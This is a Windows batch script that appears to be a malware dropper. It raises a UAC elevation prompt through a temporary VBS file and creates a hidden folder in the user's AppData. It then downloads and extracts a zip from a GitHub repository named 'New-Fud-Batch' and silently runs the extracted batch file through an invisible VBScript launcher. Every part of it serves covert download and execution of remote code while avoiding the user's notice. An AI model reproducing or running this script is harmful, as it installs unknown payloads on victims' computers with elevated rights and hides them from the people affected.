powershell -window hidden -command ""

    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0

cd "C:\Users\%USERNAME%\AppData\Local"
mkdir "Anon"
attrib +h "Anon" /s /d
cd C:\Users\%USERNAME%\AppData\Local\Anon" 
wget https://github.com/AnonAm93/New-Fud-Batch/blob/main/.zip
tar -xf .zip
del .zip
echo CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False >> C:\Users\%USERNAME%\AppData\Local\Anon\invisible.vbs
wscript.exe "C:\Users\%USERNAME%\AppData\Local\Anon\invisible.vbs" "C:\Users\%USERNAME%\AppData\Local\Anon\1.bat"



